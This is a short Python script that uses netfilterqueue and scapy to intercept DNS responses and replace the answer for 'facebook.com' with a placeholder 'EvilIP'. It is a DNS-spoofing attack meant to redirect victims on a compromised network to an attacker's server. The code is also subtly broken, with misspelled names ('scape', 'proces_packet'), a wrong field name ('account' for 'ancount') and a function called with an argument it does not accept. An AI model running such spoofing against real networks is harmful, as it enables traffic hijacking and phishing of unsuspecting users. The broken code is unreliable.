#!/usr/bin/python

import netfilterqueue
import scapy.all as scapy


def del_fields():
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.UDP].len
    del scapy_packet[scapy.UDP].chksum
    return scapy_packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    #print(scapy_packet) debug

    if scapy_packet.haslayer(scapy.DNSRR):#get dns response
        qname = scapy_packet[scape.DNSQR] #
        if "facebook.com" in qname:#get url needed
            answer = scapy.DNSRR(rrname=qname, rdata="EvilIP")#replacing query
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].account = 1 #Evitando load balancing

            scapy_packet = del_fields(scapy_packet)

            packet.set_payload(str(scapy_packet)) #load packet with new info

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, proces_packet)
queue.run()

